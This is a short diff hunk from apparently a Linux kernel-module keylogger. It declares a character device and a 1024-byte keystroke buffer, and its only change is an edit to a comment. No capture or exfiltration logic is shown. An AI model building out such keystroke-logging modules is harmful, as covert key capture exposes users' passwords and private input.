@@ -12,7 +12,7 @@ static int major;  // Major number for CHARDEV
 
 // Keylogger Info
 #define BUFFER_LEN 1024
-static char keys_buffer[BUFFER_LEN];  // This buffer will contain all the logged keys
+static char keys_buffer[BUFFER_LEN];  // This buffer will contain all the logged keys/..
 static char *keys_bf_ptr = keys_buffer; //This buffer holds the characters, it is limit to 1024. Be aware to not Overflow.
 int buf_pos = 0;  // Counting characters to avoid overflow
 
